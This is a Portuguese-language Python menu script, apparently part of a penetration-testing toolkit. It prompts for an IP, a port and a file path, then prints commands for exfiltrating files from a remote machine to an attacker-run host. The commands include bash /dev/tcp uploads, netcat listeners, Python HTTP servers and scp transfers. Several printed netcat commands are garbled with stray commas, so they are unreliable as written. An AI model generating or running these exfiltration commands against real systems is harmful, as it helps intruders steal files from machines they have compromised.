# BIBLIOTESCAS
# =============================
from os import system
from time import sleep
# =============================
#
#
# Funçao de Transferencia de arquivos


def fun_trans_file():
    while True:
        system('clear')
        print("""
   ╔╦╗╦═╗╔═╗╔╗╔╔═╗╔═╗╔═╗╦═╗╔═╗╔╗╔╔═╗╦╔═╗  ╔╦╗╔═╗  ╔═╗╦═╗╔═╗ ╦ ╦╦╦  ╦╔═╗╔═╗
    ║ ╠╦╝╠═╣║║║╚═╗╠╣ ║╣ ╠╦╝║╣ ║║║║  ║╠═╣   ║║║╣   ╠═╣╠╦╝║═╬╗║ ║║╚╗╔╝║ ║╚═╗
    ╩ ╩╚═╩ ╩╝╚╝╚═╝╚  ╚═╝╩╚═╚═╝╝╚╝╚═╝╩╩ ╩  ═╩╝╚═╝  ╩ ╩╩╚═╚═╝╚╚═╝╩ ╚╝ ╚═╝╚═╝\n
    - Vários métodos de exfiltração de dados e download de uma máquina remota.

    [01] - Bash Upload
    [02] - Bash Download 
    [03] - Netcat
    [04] - Python 
    [05] - SCP
    [06] - Menu
    [99] - Sair
    """)
        cmd = str(input("===> "))
        if cmd == '1':
            system('clear')
            IP = str(input('Digite o endereço IP: '))
            PORTA = int(input('Digite a PORTA: '))
            ARQUIVO = str(input('Digite o caminho do arquivo: '))
            print(f"""
    ╔╗ ╔═╗╔═╗╦ ╦  ╦ ╦╔═╗╦  ╔═╗╔═╗╔╦╗
    ╠╩╗╠═╣╚═╗╠═╣  ║ ║╠═╝║  ║ ║╠═╣ ║║
    ╚═╝╩ ╩╚═╝╩ ╩  ╚═╝╩  ╩═╝╚═╝╩ ╩═╩╝\n
    - Carregar arquivo PORTA HTTP (requer serviço HTTP em execução na máquina do invasor)

    bash -c 'echo -e "POST / HTTP/0.9 $(<{ARQUIVO})" > /dev/tcp/{IP}/{PORTA}'

    - Exfiltrar arquivo sobre TCP# Ouvir com Netcat na PORTA {PORTA} + redirecionamento de saída

    nc -l -p ,{PORTA}, ,>, data

    bash -c 'cat {ARQUIVO} > /dev/tcp/{IP}/{PORTA}'""")

            input("[*] - Pressione ENTER para voltar...")
            fun_trans_file()
            break

        elif cmd == '2':
            system('clear')
            IP = str(input('Digite o endereço IP: '))
            PORTA = int(input('Digite a PORTA: '))
            ARQUIVO = str(input('Digite o caminho do arquivo: '))
            print(f"""
    ╔╗ ╔═╗╔═╗╦ ╦  ╔╦╗╔═╗╦ ╦╔╗╔╦  ╔═╗╔═╗╔╦╗
    ╠╩╗╠═╣╚═╗╠═╣   ║║║ ║║║║║║║║  ║ ║╠═╣ ║║
    ╚═╝╩ ╩╚═╝╩ ╩  ═╩╝╚═╝╚╩╝╝╚╝╩═╝╚═╝╩ ╩═╩╝\n
    - Enviar via netcat

    nc -l -p ,{PORTA}, ,<, ,{ARQUIVO}

    - Baixar arquivo na outra máquina

    bash -c 'cat < /dev/tcp/{IP}/{PORTA} > {ARQUIVO}'""")
            input("[*] - Pressione ENTER para voltar...")
            fun_trans_file()
            break

        elif cmd == '3':
            system('clear')
            IP = str(input('Digite o endereço IP: '))
            PORTA = int(input('Digite a PORTA: '))
            ARQUIVO = str(input('Digite o caminho do arquivo: '))
            print(f"""
    ╔╗╔╔═╗╔╦╗╔═╗╔═╗╔╦╗
    ║║║║╣  ║ ║  ╠═╣ ║ 
    ╝╚╝╚═╝ ╩ ╚═╝╩ ╩ ╩\n

    -  Enviar payload

    nc -lnvp ; ,{PORTA},nc {IP} {PORTA} < {ARQUIVO}

    - Baixar

    nc {IP} {PORTA} < {ARQUIVO}

    nc -lnvp ,{PORTA}, ,>, file_saved""")
            input("[*] - Pressione ENTER para voltar...")
            fun_trans_file()
            break
        elif cmd == '4':
            system('clear')
            IP = str(input('Digite o endereço IP: '))
            PORTA = int(input('Digite a PORTA: '))
            ARQUIVO = str(input('Digite o caminho do arquivo: '))
            print(f"""
    ╔═╗╦ ╦╔╦╗╦ ╦╔═╗╔╗╔
    ╠═╝╚╦╝ ║ ╠═╣║ ║║║║
    ╩   ╩  ╩ ╩ ╩╚═╝╝╚╝\n

    - Python3 HTTP Server

    python3 -m http.server {PORTA}

    - Python2 HTTP Server

    python -m SimpleHTTPServer {PORTA}""")
            input("[*] - Pressione ENTER para voltar...")
            fun_trans_file()
            break
        elif cmd == '5':
            system('clear')
            IP = str(input('Digite o endereço IP: '))
            PORTA = int(input('Digite a PORTA: '))
            ARQUIVO = str(input("Digite o caminho do arquivo: "))
            USER = str(input('Digite o username: '))
            print(f"""
    ╔═╗╔═╗╔═╗
    ╚═╗║  ╠═╝
    ╚═╝╚═╝╩ \n

    - Carregar do host local para o computador remoto

    scp {ARQUIVO} {USER}@{IP}:~/destination -P {PORTA}

    - Baixe do computador remoto

    scp {USER}@{IP}:~/path_to_file file_saved -P {PORTA}""")
            input("[*] - Pressione ENTER para voltar...")
            fun_trans_file()
            break
        elif cmd == '6':
            break
        elif cmd == '99':
            print("Até logo...")
            exit()
        else:
            print("Comando Inválido!!!")
            sleep(2)
